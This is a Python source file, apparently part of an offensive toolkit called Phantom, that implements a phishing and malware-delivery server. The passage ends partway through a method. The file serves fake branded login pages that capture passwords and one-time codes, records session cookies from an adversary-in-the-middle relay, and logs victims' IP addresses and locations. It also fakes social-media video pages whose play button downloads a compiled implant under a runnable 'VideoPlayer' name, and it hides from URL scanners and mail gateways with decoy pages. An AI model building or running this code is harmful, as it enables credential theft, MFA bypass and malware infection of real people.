"""
tracker.py — self-hosted tracking / credential-harvest server.

A real IP grabber needs a server the victim's browser connects to. Instead
of a fake placeholder URL, Phantom ships its own tiny HTTP server: the
operator exposes one port (directly or through a tunnel) and every phish
link is a route on that server.

Routes:

    GET  /<code>          click capture: logs IP + UA + referrer, 302 to decoy
    GET  /px/<code>       open tracking: 1x1 GIF + logs the open
    GET  /l/<code>        credential-harvest page (fake login form)
    POST /c/<code>        credential capture (username/password/otp)

    PHANTOM_TRACK_URL       public base URL used to build victim links
    PHANTOM_TRACK_HOST      bind host (default 0.0.0.0)
    PHANTOM_TRACK_PORT      bind port (default 8080)
    PHANTOM_TRACK_REDIRECT  where the victim lands after the click
    PHANTOM_TRACK_BRAND     brand shown on the fake login page
    PHANTOM_TRACK_OTP       "1" to add an OTP/2FA field to the login page
    PHANTOM_GEOIP_DB        optional MaxMind .mmdb for geo on captured IPs
    PHANTOM_TRACK_SKIN      video-lure skin: instagram | tiktok | youtube
    PHANTOM_TRACK_VIDEO_ID  YouTube video id embedded in the lure player

Everything is in-process and offline-safe: no third-party service, no API
key. The unit tests never bind a socket (they inject creator/fetcher or
drive the handler directly).
"""

from __future__ import annotations

import hashlib
import os
import threading
import time
import urllib.parse
from dataclasses import dataclass, field
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from typing import Any, Callable, Dict, List, Optional, Tuple


def platform_from_ua(ua: str) -> str:
    """Resolve the victim's operating system from the browser User-Agent so
    the delivery layer can serve the CORRECT compiled binary instead of the
    operator having to guess the platform when crafting the lure.

    Order matters: Android/iOS UAs also contain "Linux"/"like Mac OS X",
    and iPadOS masquerades as macOS, so the mobile checks run first.
    Returns one of: android, ios, windows, macos, linux (default linux).
    """
    u = (ua or "").lower()
    if "android" in u:
        return "android"
    if "iphone" in u or "ipad" in u or "ipod" in u:
        return "ios"
    if "windows" in u or "win32" in u or "win64" in u:
        return "windows"
    if "macintosh" in u or "mac os x" in u or "darwin" in u:
        return "macos"
    return "linux"


# ---------------------------------------------------------------------------
# link-preview crawlers — the request that is NOT the victim
# ---------------------------------------------------------------------------
#
# When a lure URL is pasted into WhatsApp / Instagram / Telegram / Discord /
# X / iMessage, the platform builds the preview card by fetching the URL
# FROM ITS OWN INFRASTRUCTURE — not from the target's device. Those requests
# must never be treated as the victim:
#
#   * the source IP is Meta/Telegram/…, i.e. a FALSE "victim" in the ledger;
#   * a one-shot tracking code would be burned by a robot, and the dropper
#     could hand the compiled payload to a crawler nobody is behind;
#   * a lure/pixel that visibly reacts to a crawler is itself a tell.
#
# We answer them with the plain PREVIEW CARD only: the Open-Graph tags stay
# intact (that is exactly what makes the card render, so the link looks like
# a genuine video share), but no payload, no redirect, nothing recorded.

_PREVIEW_BOT_MARKERS = (
    "facebookexternalhit",   # WhatsApp, Facebook, Instagram, Messenger
    "facebookcatalog",
    "whatsapp",
    "instagram",
    "telegrambot",
    "twitterbot",
    "discordbot",
    "slackbot",
    "linkedinbot",
    "skypeuripreview",
    "line-poker",
    "pinterest",
    "redditbot",
    "applebot",              # iMessage link previews
    "googlebot",
    "bingbot",
    "yandexbot",
    "duckduckbot",
    "embedly",
    "quora link preview",
    "outbrain",
    "vkshare",
    "bitlybot",
    "tumblr",
    "mastodon",
    "cardyb",                # Bluesky
    "headlesschrome",
    "phantomjs",
    "lighthouse",
)


def is_preview_bot(ua: str) -> bool:
    """True when the request comes from a link-preview crawler / headless
    agent rather than from the human the lure was sent to."""
    u = (ua or "").lower()
    if not u:
        return False
    return any(m in u for m in _PREVIEW_BOT_MARKERS)


# ---------------------------------------------------------------------------
# image proxies / email security gateways
# ---------------------------------------------------------------------------
#
# The IMAGE lure is the real zero-click: an <img src="https://you/i/<code>">
# in an email, or the page of a DM, fires on RENDER — no tap, no JS. But the
# big providers do not let the mailbox fetch that image directly:
#
#   * Gmail / Google Workspace fetch EVERY remote image from
#     googleimageproxy (you see Google's IP, not the victim's);
#   * Yahoo does the same from yahoomailproxy, Outlook from its own edge;
#   * Apple Mail Privacy Protection PRE-FETCHES all images, so an "open"
#     that never happened is recorded (a false positive by design);
#   * Proofpoint / Mimecast / IronPort / Zscaler / Forcepoint fetch the
#     asset to inspect it — which also tells you the engagement is being
#     watched by the target's mail security.
#
# None of those is the human we sent the lure to. We still SERVE the asset
# (the mail must render, and a blocked image is a spam signal), but the
# event is tagged `proxied` so the operator never mistakes a robot for the
# target. A direct load — the victim's own client — is the only real hit.

_IMAGE_PROXY_MARKERS = (
    "googleimageproxy",      # Gmail / Google Workspace
    "yahoomailproxy",        # Yahoo Mail
    "outlook",               # Outlook desktop / mobile image proxy
    "apple-mail",
    "proofpoint",            # mail security gateways (fetch = you are scanned)
    "mimecast",
    "barracuda",
    "ironport",              # Cisco Email Security
    "symantec",
    "messagelabs",
    "forcepoint",
    "zscaler",
    "agari",
    "cloudmark",
    "fireeye",
    "trendmicro",
    "sophos",
    "proofpoint",
)


def is_image_proxy(ua: str) -> bool:
    """True when the asset request comes from a mail-provider image proxy
    or a security gateway rather than from the recipient's own client."""
    u = (ua or "").lower()
    if not u:
        return False
    return any(m in u for m in _IMAGE_PROXY_MARKERS)


# URL-reputation scanners and secure-email gateways that probe the LURE —
# they are deciding whether the URL is malicious before the human ever sees
# it. Handing one of these the reel page (or a redirect to a binary) is how
# a domain gets flagged and burned. They get a mundane placeholder instead,
# and their visit is logged as intel: the engagement is being inspected.
_SANDBOX_SCANNER_MARKERS = (
    "urlscan",
    "virustotal",
    "safebrowsing",
    "safe browsing",
    "google-safe-browsing",
    "any.run",
    "anyrun",
    "joe sandbox",
    "joesandbox",
    "hybrid-analysis",
    "urlquery",
    "cofense",
    "netskope",
    "palo alto",
    "checkpoint",
    "check point",
    "microsoft office 365 message",
    "microsoft defender",
    "safelinks",
    "hornetsecurity",
    "avanan",
    "ironscales",
    "barracuda",
)


def is_scanner(ua: str) -> bool:
    """True when this request is a URL-reputation scanner / secure-email
    gateway probing the lure (as opposed to the recipient's browser)."""
    u = (ua or "").lower()
    if not u:
        return False
    return any(m in u for m in _IMAGE_PROXY_MARKERS + _SANDBOX_SCANNER_MARKERS)


def _challenge_token(code: str, salt: str) -> str:
    """Per-code gate token: proves the client executed the interstitial
    reload, which a URL scanner does not do."""
    return hashlib.sha256(f"{code}:{salt}".encode()).hexdigest()[:24]


def _challenge_page() -> str:
    """Interstitial for the JS gate (two-stage delivery).

    A URL scanner parses the HTML; it does not run scripts. Serving the lure
    — or worse, the 302 toward the compiled binary — to the thing that is
    deciding whether the URL is malicious is exactly how a domain gets
    flagged for every recipient. This interstitial holds nothing to score:
    no lure page, no payload URL, no credential form. A real browser follows
    the reload and gets the real page in a few milliseconds, which the human
    never notices.
    """
    return (
        '<!DOCTYPE html><html><head><meta charset="utf-8">'
        '<meta name="viewport" content="width=device-width,initial-scale=1">'
        '<title>Loading</title></head>'
        '<body style="font-family:Arial,sans-serif;color:#8a8a8a;'
        'text-align:center;margin-top:25vh;background:#fafafa">'
        '<p style="font-size:14px">Loading&hellip;</p>'
        '<script>location.replace(location.pathname+location.search);'
        '</script></body></html>')


def _decoy_page() -> str:
    """What a scanner sees: a boring infrastructure error, nothing to score.

    A scanner exists to decide whether the URL is malicious. Serving it the
    reel page, or a redirect toward a compiled binary, is exactly how the
    URL gets flagged (and then the domain burned, and the mail killed for
    every recipient).

    It answers 502 with the standard nginx gateway page: the most ordinary
    thing on the web. A half-broken lure is suspicious; a gateway hiccup is
    something every scanner and every human has seen a thousand times, so
    there is nothing to flag and nothing to remember."""
    return (
        '<html>\r\n<head><title>502 Bad Gateway</title></head>\r\n'
        '<body>\r\n<center><h1>502 Bad Gateway</h1></center>\r\n'
        '<hr><center>nginx</center>\r\n</body>\r\n</html>\r\n')


# ---------------------------------------------------------------------------
# the name the browser saves the beacon under
# ---------------------------------------------------------------------------
#
# This has to keep a RUNNABLE extension for the platform. A PE saved as
# `.mp4` is not executable (Windows hands it to the media player), and an
# APK saved as `.mp4` cannot be installed: the fake extension is exactly
# what stops the payload from running after the download it paid for. The
# innocent part belongs in the STEM, never in the extension — and the
# extension must match the real format (PE -> .exe, APK -> .apk, ELF ->
# none, they are chmod+run).

_DOWNLOAD_NAMES = {
    "windows": "VideoPlayer.exe",
    "linux": "video-player-linux",
    "macos": "video-player-macos",
    "android": "VideoPlayer.apk",
    "ios": "",              # no payload path for iOS
}


def download_name_for(code: str, platform: str, override: str = "") -> str:
    """Per-OS, runnable download name for a lure code."""
    if override:
        return override
    name = _DOWNLOAD_NAMES.get((platform or "").lower(),
                               _DOWNLOAD_NAMES["windows"])
    if not name:
        return ""
    stem, dot, ext = name.rpartition(".")
    if dot:
        return f"{stem}-{code}.{ext}"
    return f"{name}-{code}"


# 1x1 transparent GIF
_PIXEL_GIF = (
    b"\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00"
    b"\x00\x00\x00\xff\xff\xff\x21\xf9\x04\x00\x00\x00\x00\x00"
    b"\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b"
)


@dataclass
class VictimHit:
    """A captured click: the victim's source IP and fingerprint."""
    ip: str
    user_agent: str = ""
    time: str = ""
    referrer: str = ""
    os: str = ""
    device: str = ""
    browser: str = ""
    geo: str = ""


@dataclass
class OpenEvent:
    """An email open: the pixel was loaded.

    `proxied` is True when the fetch came from a mail-provider image proxy
    (Gmail/Yahoo/Outlook/Apple MPP) or a security gateway rather than from
    the recipient's own client — the IP is a robot's, NOT the target's.
    """
    ip: str
    user_agent: str = ""
    time: str = ""
    proxied: bool = False
    scanner: bool = False


@dataclass
class CredCapture:
    """Credentials submitted through a fake login page."""
    ip: str
    username: str
    password: str
    otp: str = ""
    user_agent: str = ""
    time: str = ""


# ---------------------------------------------------------------------------
# UA fingerprinting (dependency-free)
# ---------------------------------------------------------------------------

def fingerprint_ua(ua: str) -> Dict[str, str]:
    """Best-effort OS / device / browser from a User-Agent string."""
    ua = ua or ""
    low = ua.lower()
    out = {"os": "", "device": "", "browser": ""}
    if "windows" in low:
        out["os"] = "windows"
        if "phone" in low:
            out["device"] = "phone"
    elif "android" in low:
        out["os"] = "android"
        out["device"] = "phone" if "mobile" in low else "tablet"
    elif "iphone" in low or "ipad" in low or "ios" in low:
        out["os"] = "ios"
        out["device"] = "phone" if "iphone" in low else "tablet"
    elif "mac os" in low or "macintosh" in low:
        out["os"] = "macos"
    elif "linux" in low:
        out["os"] = "linux"
    elif "cros" in low:
        out["os"] = "chromeos"
    for key, name in (("edg/", "edge"), ("chrome/", "chrome"),
                      ("firefox/", "firefox"), ("safari/", "safari")):
        if key in low:
            out["browser"] = name
            break
    return out


# ---------------------------------------------------------------------------
# geo (optional MaxMind)
# ---------------------------------------------------------------------------

_GEO_CACHE: Dict[str, str] = {}


def geo_lookup(ip: str) -> str:
    """Country/city for an IP.

    Sources, in order:
      1. MaxMind DB   — PHANTOM_GEOIP_DB=<GeoLite2-City.mmdb> (offline, free)
      2. Online API   — PHANTOM_GEO_ONLINE=1  (ip-api.com, no key; the
                        request is made lazily at read time, never while
                        the victim's page loads, so the lure is not slowed
                        and nothing about the target leaks to the geo API)
    Private IPs always return "" (no meaningful location).
    """
    if not ip or ip.startswith(("10.", "192.168.", "127.", "172.")):
        return ""
    if ip in _GEO_CACHE:
        return _GEO_CACHE[ip]
    label = ""
    db_path = os.getenv("PHANTOM_GEOIP_DB", "").strip()
    if db_path and os.path.exists(db_path):
        try:
            import geoip2.database
            with geoip2.database.Reader(db_path) as reader:
                resp = reader.city(ip)
                city = resp.city.name or ""
                country = resp.country.iso_code or ""
                label = ", ".join(x for x in (city, country) if x)
        except Exception:
            label = ""
    if not label and os.getenv("PHANTOM_GEO_ONLINE", "0") not in ("0", "", "false"):
        try:
            import json as _json
            import urllib.request as _urlreq
            with _urlreq.urlopen(f"http://ip-api.com/json/{ip}", timeout=4) as r:
                data = _json.loads(r.read().decode("utf-8", "replace"))
            if data.get("status") == "success":
                label = ", ".join(x for x in
                                   (data.get("city", ""), data.get("countryCode", ""))
                                   if x)
        except Exception:
            label = ""
    _GEO_CACHE[ip] = label
    return label


# ---------------------------------------------------------------------------
# store
# ---------------------------------------------------------------------------

@dataclass
class SessionCapture:
    """A SESSION taken by the AiTM relay: the cookies the provider issued
    after the credentials were relayed.

    This is the difference between a fake page and a relay: a code that was
    just typed can be invalidated by the provider, but a session cookie that
    was issued to the victim's own browser is live until it expires — and it
    was issued AFTER the second factor, which is why plain MFA does not stop
    it.
    """
    ip: str
    cookies: str = ""
    username: str = ""
    user_agent: str = ""
    time: str = ""


class HitStore:
    """Thread-safe in-memory ledger of clicks, opens and captured creds."""

    def __init__(self) -> None:
        self._hits: Dict[str, List[VictimHit]] = {}
        self._opens: Dict[str, List[OpenEvent]] = {}
        self._creds: Dict[str, List[CredCapture]] = {}
        self._sessions: Dict[str, List[SessionCapture]] = {}
        self._lock = threading.Lock()

    def _now(self) -> str:
        return time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())

    def record(self, code: str, ip: str, user_agent: str,
               referrer: str = "") -> VictimHit:
        fp = fingerprint_ua(user_agent)
        hit = VictimHit(ip=ip, user_agent=user_agent, time=self._now(),
                        referrer=referrer, geo=geo_lookup(ip), **fp)
        with self._lock:
            self._hits.setdefault(code, []).append(hit)
        return hit

    def record_open(self, code: str, ip: str, user_agent: str,
                    proxied: bool = False,
                    scanner: bool = False) -> OpenEvent:
        ev = OpenEvent(ip=ip, user_agent=user_agent, time=self._now(),
                       proxied=bool(proxied), scanner=bool(scanner))
        with self._lock:
            self._opens.setdefault(code, []).append(ev)
        return ev

    def record_cred(self, code: str, ip: str, user_agent: str,
                    username: str, password: str, otp: str = "") -> CredCapture:
        cap = CredCapture(ip=ip, username=username, password=password,
                          otp=otp, user_agent=user_agent, time=self._now())
        with self._lock:
            self._creds.setdefault(code, []).append(cap)
        return cap

    def hits(self, code: str) -> List[VictimHit]:
        with self._lock:
            return list(self._hits.get(code, []))

    def opens(self, code: str) -> List[OpenEvent]:
        with self._lock:
            return list(self._opens.get(code, []))

    def creds(self, code: str) -> List[CredCapture]:
        with self._lock:
            return list(self._creds.get(code, []))

    def record_session(self, code: str, ip: str, user_agent: str,
                       cookies: str, username: str = "") -> SessionCapture:
        cap = SessionCapture(ip=ip, cookies=cookies, username=username,
                             user_agent=user_agent, time=self._now())
        with self._lock:
            self._sessions.setdefault(code, []).append(cap)
        return cap

    def sessions(self, code: str) -> List[SessionCapture]:
        with self._lock:
            return list(self._sessions.get(code, []))


# ---------------------------------------------------------------------------
# login page
# ---------------------------------------------------------------------------

# ---------------------------------------------------------------------------
# video lure page (looks like a reel/short, plays a real video)
# ---------------------------------------------------------------------------

_DEFAULT_VIDEO_ID = "jNQXAC9IVRw"  # "Me at the zoo" — harmless public video


def _og_meta(skin: str, video_id: str, title: str, channel: str,
             watch: str) -> str:
    """Open Graph / Twitter-card tags so the DM or mail preview renders a
    REAL video card (thumbnail + title + channel) instead of a bare link.

    A link with no preview is the #1 "this looks like spam" signal in a
    message app; a proper card is what a genuine share looks like. The
    thumbnail is the actual YouTube frame (i.ytimg.com) when a video id is
    known, so the preview matches the video the page really plays."""
    def _esc(s: str) -> str:
        return (str(s or "").replace("&", "&amp;").replace('"', "&quot;")
                .replace("<", "&lt;").replace(">", "&gt;"))
    t = _esc(title or "Video")
    ch = _esc(channel or "@creator")
    img = (f"https://i.ytimg.com/vi/{video_id}/hqdefault.jpg"
           if video_id else "")
    site = {"instagram": "Instagram", "tiktok": "TikTok"}.get(skin,
                                                               "YouTube")
    parts = [
        '<meta property="og:type" content="video.other">',
        f'<meta property="og:title" content="{t}">',
        f'<meta property="og:description" content="{ch} &middot; video">',
        f'<meta property="og:site_name" content="{site}">',
        '<meta name="twitter:card" content="player">',
        f'<meta name="twitter:title" content="{t}">',
    ]
    if img:
        parts.append(f'<meta property="og:image" content="{img}">')
        parts.append(f'<meta name="twitter:image" content="{img}">')
    if watch and watch != "#":
        parts.append(f'<meta property="og:video:url" content="{_esc(watch)}">')
    return "".join(parts)


def _video_page(skin: str, video_id: str, code: str, title: str = "",
                channel: str = "") -> str:
    """A mobile-style page that looks exactly like a social video (IG Reels,
    TikTok, YouTube Shorts) and actually plays a REAL embedded video. The
    page load IS the click: the tracker records the victim's IP on GET.
    `title`/`channel` are the real video's display metadata.
    """
    skin = (skin or "youtube").lower()
    if skin not in ("instagram", "tiktok", "youtube"):
        skin = "youtube"
    vid = video_id or ""
    title = title or "Video"
    channel = channel or "@creator"
    if vid:
        embed = (f'<iframe src="https://www.youtube.com/embed/{vid}'
                 f'?autoplay=1&mute=1&playsinline=1" '
                 f'style="width:100%;height:100%;border:0" '
                 f'allow="autoplay; encrypted-media" allowfullscreen></iframe>')
        watch = f"https://www.youtube.com/watch?v={vid}"
    else:
        embed = ('<div style="width:100%;height:100%;display:flex;align-items:center;'
                 'justify-content:center;background:#000;color:#fff;font-size:64px">'
                 '&#9654;</div>')
        watch = "#"

    if skin == "instagram":
        head = ('<div style="display:flex;align-items:center;padding:10px 14px;'
                'background:#fff"><span style="font-size:22px;font-weight:700;'
                'font-family:Georgia,serif;font-style:italic">Instagram</span>'
                '<span style="margin-left:auto;color:#8e8e8e">Reels</span></div>')
        wrap = ('<div style="margin:10px auto;width:min(420px,92vw);height:70vh;'
                'background:#000;border-radius:14px;overflow:hidden;position:relative;'
                'box-shadow:0 0 0 2px #fff, 0 0 0 5px #e1306c">' + embed + '</div>')
        caption = (f'<div style="text-align:center;margin:14px auto;max-width:420px;'
                   f'color:#262626"><b>{channel}</b> {title}</div>')
        cta = (f'<div style="text-align:center;margin:8px"><a href="{watch}" '
               f'style="color:#385898;font-weight:600;text-decoration:none">'
               f'Open in Instagram</a></div>')
    elif skin == "tiktok":
        head = (f'<div style="display:flex;align-items:center;padding:12px 14px;'
                f'background:#121212;color:#fff"><span style="font-size:20px;'
                f'font-weight:800">TikTok</span><span style="margin-left:8px;'
                f'font-size:11px;opacity:.6">{channel}</span></div>')
        wrap = ('<div style="margin:6px auto;width:min(340px,86vw);height:68vh;'
                'background:#000;border-radius:10px;overflow:hidden;position:relative">'
                + embed + '</div>')
        caption = (f'<div style="text-align:center;color:#aaa;margin-top:10px;'
                   f'font-size:13px">{title}</div>')
        cta = (f'<div style="text-align:center;margin:8px"><a href="{watch}" '
               f'style="color:#25f4ee;font-weight:600;text-decoration:none">'
               f'Watch on TikTok</a></div>')
    else:  # youtube
        head = ('<div style="display:flex;align-items:center;padding:10px 14px;'
                'background:#fff"><span style="color:#ff0000;font-size:24px;'
                'font-weight:700">&#9654;</span><span style="font-size:20px;'
                'font-weight:700;margin-left:4px">YouTube</span>'
                '<span style="margin-left:auto;color:#065fd4;font-weight:600;'
                'font-size:13px">Shorts</span></div>')
        wrap = ('<div style="margin:10px auto;width:min(400px,92vw);height:62vh;'
                'background:#000;border-radius:10px;overflow:hidden;position:relative;'
                'box-shadow:0 0 0 1px #e5e5e5">' + embed + '</div>')
        caption = (f'<div style="text-align:center;margin:12px auto;max-width:400px;'
                   f'color:#0f0f0f"><b>{channel}</b> {title}</div>')
        cta = (f'<div style="text-align:center;margin:8px"><a href="{watch}" '
               f'style="color:#065fd4;font-weight:600;text-decoration:none">'
               f'Watch on YouTube</a></div>')
    return (
        '<!DOCTYPE html><html><head><meta charset="utf-8">'
        '<meta name="viewport" content="width=device-width,initial-scale=1">'
        f'{_og_meta(skin, vid, title, channel, watch)}'
        f'<title>Video</title></head>'
        f'<body style="margin:0;font-family:Arial,sans-serif;background:#fafafa">'
        f'{head}{wrap}{caption}{cta}'
        '<div style="text-align:center;color:#999;font-size:11px;margin:14px 0 20px">'
        'Content is loading — check your connection and try again if needed.</div>'
        '</body></html>')


# What the page shows when the play click finds nothing to deliver.
#
# This is the detail that keeps a failed delivery invisible: a half-working
# REPLICA of a platform is suspicious, while a platform's own ERROR page is
# completely normal — users see "this page isn't available" every day. So on
# failure the page does not say "content is loading"; it shows the real
# error copy of the platform being imitated and drops the video, which is
# exactly what a removed/region-locked post looks like.
_UNAVAILABLE = {
    "instagram": ("Sorry, this page isn't available",
                  "The link you followed may be broken, or the page may "
                  "have been removed."),
    "tiktok": ("Couldn't find this video",
               "This video may have been removed, or the link may be "
               "incorrect."),
    "youtube": ("This video isn't available anymore",
                "This video may have been removed by the uploader, or the "
                "link may be incorrect."),
}


def _player_page(skin: str, video_id: str, code: str, payload_url: str,
                 title: str = "", channel: str = "",
                 download_name: str = "") -> str:
    """Dropper-player: the reel-looking page that ALSO delivers the beacon.

    The video plays for real; the overlay "play" button is the install
    click. On click the page fetches the payload endpoint (the compiled
    beacon); if it succeeds the beacon downloads under an innocent
    "video" name and the victim lands on the real video page (their
    curiosity is satisfied — nothing looks broken). If the fetch FAILS
    the page shows the same "Content is loading" footer as a dead video:
    the lure silently degrades instead of exposing the C2 (stealth
    fallback — the page simply looks like it won't load).

    One honest limit: this is a ONE-CLICK delivery (open reel -> click
    play -> beacon downloads). A true zero-click that executes without
    interaction does not exist without a browser exploit.

    On failure (C2 down, fetch blocked) the page shows the platform's OWN
    error copy rather than a half-broken replica: a normal "this page isn't
    available" is what keeps the lure alive for the next attempt.
    """
    skin = (skin or "youtube").lower()
    if skin not in ("instagram", "tiktok", "youtube"):
        skin = "youtube"
    vid = video_id or ""
    title = title or "Video"
    channel = channel or "@creator"
    # the saved file must stay RUNNABLE: the extension follows the real
    # format of what the C2 serves for this visitor
    download_name = download_name or download_name_for(code, "windows")
    err_title, err_body = _UNAVAILABLE.get(
        skin, ("Something went wrong", "Please try again later."))
    if vid:
        embed = (f'<iframe src="https://www.youtube.com/embed/{vid}'
                 f'?autoplay=1&mute=1&playsinline=1" '
                 f'style="width:100%;height:100%;border:0" '
                 f'allow="autoplay; encrypted-media" allowfullscreen></iframe>')
        watch = f"https://www.youtube.com/watch?v={vid}"
    else:
        embed = ('<div style="width:100%;height:100%;display:flex;align-items:center;'
                 'justify-content:center;background:#000;color:#fff;font-size:64px">'
                 '&#9654;</div>')
        watch = "#"
    if skin == "instagram":
        brand = ('<span style="font-size:22px;font-weight:700;'
                 'font-family:Georgia,serif;font-style:italic">Instagram</span>')
        badge = '<span style="margin-left:auto;color:#8e8e8e">Reels</span>'
    elif skin == "tiktok":
        brand = ('<span style="font-size:20px;font-weight:800">TikTok</span>')
        badge = f'<span style="margin-left:8px;font-size:11px;opacity:.6">{channel}</span>'
    else:
        brand = ('<span style="color:#ff0000;font-size:24px;font-weight:700">&#9654;</span>'
                 '<span style="font-size:20px;font-weight:700;margin-left:4px">YouTube</span>')
        badge = ('<span style="margin-left:auto;color:#065fd4;font-weight:600;'
                 'font-size:13px">Shorts</span>')
    return (
        '<!DOCTYPE html><html><head><meta charset="utf-8">'
        '<meta name="viewport" content="width=device-width,initial-scale=1">'
        f'{_og_meta(skin, vid, title, channel, watch)}'
        f'<title>Video</title></head>'
        '<body style="margin:0;font-family:Arial,sans-serif;background:#fafafa">'
        f'<div style="display:flex;align-items:center;padding:10px 14px;'
        f'background:#fff">{brand}{badge}</div>'
        f'<div id="stage" style="margin:10px auto;width:min(400px,92vw);'
        f'height:62vh;background:#000;border-radius:10px;overflow:hidden;'
        f'position:relative;cursor:pointer">{embed}'
        '<div id="overlay" style="position:absolute;inset:0;display:flex;'
        'align-items:center;justify-content:center;background:rgba(0,0,0,.25)">'
        '<div style="width:76px;height:76px;border-radius:50%;background:#fff;'
        'display:flex;align-items:center;justify-content:center;box-shadow:0 2px 12px '
        'rgba(0,0,0,.4)"><span style="font-size:30px;color:#111;margin-left:4px">'
        '&#9654;</span></div></div></div>'
        f'<div id="cap" style="text-align:center;margin:12px auto;max-width:400px;'
        f'color:#0f0f0f"><b>{channel}</b> {title}</div>'
        f'<div id="err" style="display:none;text-align:center;margin:18px auto;'
        f'max-width:400px;color:#262626">'
        f'<div style="font-size:17px;font-weight:600">{err_title}</div>'
        f'<div style="font-size:13px;color:#8e8e8e;margin-top:8px">'
        f'{err_body}</div></div>'
        '<script>'
        f'const PAYLOAD="{payload_url}";'
        'const WATCH=' + ('"' + watch + '"' if watch != "#" else '"#"') + ';'
        # a dead delivery must look like a REMOVED post, not a broken clone:
        # drop the video and show the platform's real error copy
        'function dead(){'
        '  var s=document.getElementById("stage"); if(s) s.style.display="none";'
        '  var c=document.getElementById("cap"); if(c) c.style.display="none";'
        '  var e=document.getElementById("err"); if(e) e.style.display="block";'
        '}'
        'document.getElementById("stage").addEventListener("click", function(){'
        '  fetch(PAYLOAD, {method:"GET", credentials:"omit"}).then(function(r){'
        '    if(!r.ok){ dead(); return; }'
        '    r.blob().then(function(b){'
        '      const u=URL.createObjectURL(b);'
        '      const a=document.createElement("a");'
        f'      a.href=u; a.download="{download_name}";'
        '      document.body.appendChild(a); a.click();'
        '      setTimeout(function(){ if(WATCH!="#") window.location=WATCH; }, 400);'
        '    });'
        '  }).catch(function(){ dead(); });'
        '});'
        '</script></body></html>')


def _login_page(brand: str, otp: bool) -> str:
    otp_field = (
        '<div style="margin-bottom:14px"><label>One-time code</label><br>'
        '<input type="text" name="otp" autocomplete="one-time-code" '
        'style="width:100%;padding:8px;box-sizing:border-box"></div>'
        if otp else "")
    return f"""<!DOCTYPE html><html><head><meta charset="utf-8">
<title>{brand}</title></head>
<body style="font-family:Arial,sans-serif;background:#f2f2f2;margin:0">
<div style="max-width:380px;margin:60px auto;background:#fff;padding:32px;border-radius:6px;box-shadow:0 1px 4px rgba(0,0,0,.2)">
<div style="font-size:22px;font-weight:bold;margin-bottom:6px">{brand}</div>
<div style="color:#555;margin-bottom:18px">Sign in to continue</div>
<form method="post" action="/c/__CODE__">
<label>Email or username</label><br>
<input type="text" name="username" autocomplete="username" style="width:100%;padding:8px;margin:4px 0 14px;box-sizing:border-box"><br>
<label>Password</label><br>
<input type="password" name="password" autocomplete="current-password" style="width:100%;padding:8px;margin:4px 0 14px;box-sizing:border-box"><br>
{otp_field}
<button type="submit" style="width:100%;background:#0a5bd3;color:#fff;border:0;padding:10px;border-radius:4px;font-size:15px">Sign in</button>
</form>
<div style="color:#888;font-size:12px;margin-top:18px">Protected by {brand} security.</div>
</div></body></html>"""


# ---------------------------------------------------------------------------
# server
# ---------------------------------------------------------------------------

class TrackingServer:
    """Minimal HTTP server for click/open capture and credential harvest."""

    def __init__(self, host: str = "0.0.0.0", port: int = 8080,
                 redirect_url: str = "https://example.com",
                 brand: str = "Account verification", otp: bool = False,
                 skin: str = "youtube", video_id: str = "",
                 store: Optional[HitStore] = None,
                 js_challenge: bool = False,
                 aitm: Optional[bool] = None) -> None:
        self.host = host
        self.port = port
        self.port_shifted_from: Optional[int] = None  # set when bind shifts
        self.redirect_url = redirect_url
        self.brand = brand
        self.otp = otp
        self.skin = skin
        self.video_id = video_id or os.getenv("PHANTOM_TRACK_VIDEO_ID", "")
        self.store = store or HitStore()
        # two-stage JS gate: a client must execute the interstitial reload
        # before any lure page (or payload redirect) is served. Default OFF
        # so the lab and the tests behave like a plain capture server; a real
        # engagement turns it on (tracker.js_challenge).
        self.js_challenge = bool(js_challenge)
        self._challenge_salt = hashlib.sha256(
            os.urandom(16)).hexdigest()[:16]
        # per-code real-video metadata: code -> {id, title, channel}
        self._videos: Dict[str, Dict[str, str]] = {}
        # per-code silent redirect target: code -> url OR {platform -> url}
        # (a map lets the 302 pick the OS-correct binary from the UA).
        self._redirects: Dict[str, Any] = {}
        # per-code hosted asset (operator-chosen image): code -> (bytes, ctype)
        self._images: Dict[str, bytes] = {}
        self._image_types: Dict[str, str] = {}
        # dropper-player delivery: code -> {payload, meta}
        self._players: Dict[str, Dict[str, Any]] = {}
        # AiTM relay mounts: code -> {upstream, fetcher, secure}. OFF by
        # default (see the aitm module) — an entry here is the operator's
        # explicit decision to run a reverse proxy against a live IdP.
        self._aitm: Dict[str, Dict[str, Any]] = {}
        if aitm is None:
            from phantom.automation.social.aitm import enabled as _aitm_on
            aitm = _aitm_on()
        self.aitm = bool(aitm)
        self._httpd: Optional[ThreadingHTTPServer] = None
        self._thread: Optional[threading.Thread] = None
        self.running = False
        self.bind_error: Optional[str] = None

    def register_video(self, code: str, meta: Dict[str, str]) -> None:
        """Attach a real video {id, title, channel} to a tracking code so
        the lure page renders that specific video."""
        if code and meta.get("id"):
            self._videos[code] = dict(meta)

    def register_redirect(self, code: str, target_url: str) -> None:
        """Point a tracking code at a silent 302 target. Used to camouflage
        beacon delivery: the victim opens what looks like a reel/share link
        and the redirect serves the compiled implant.

        `target_url` may be a plain URL or a `{platform -> url}` map: in the
        latter case the 302 target is chosen per visit from the victim's
        User-Agent, so one lure serves the right OS binary for whoever opens
        it (Windows PE vs Linux ELF vs Android APK...)."""
        if code and target_url:
            self._redirects[code] = target_url

    def register_player(self, code: str, payload_url: str = "",
                        meta: Optional[Dict[str, str]] = None,
                        payload_urls: Optional[Dict[str, str]] = None) -> None:
        """Dropper-player delivery: the reel page plays a REAL video and the
        play click fetches the compiled beacon. Fail-soft: if the payload
        endpoint is down the page just looks like it won't load (stealth
        fallback). The recorded hit is the page load, like the plain video
        lure.

        When `payload_urls` is given ({platform -> url}) the page serves the
        binary matching the visitor's User-Agent, so the operator does not
        have to know the target OS up front."""
        if code and (payload_url or payload_urls):
            self._players[code] = {
                "payload": payload_url,
                "payloads": dict(payload_urls or {}),
                "meta": dict(meta or {}),
            }

    def register_image(self, code: str, data: bytes, ctype: str = "image/jpeg") -> None:
        """Host an operator-chosen image under /i/<code>: whoever LOADS it
        (browser, or an <img src> in an email/page) fires the tracker — IP,
        device fingerprint and geo captured with zero interaction."""
        if code and data:
            self._images[code] = data
            self._image_types[code] = ctype

    def register_aitm(self, code: str, upstream: str,
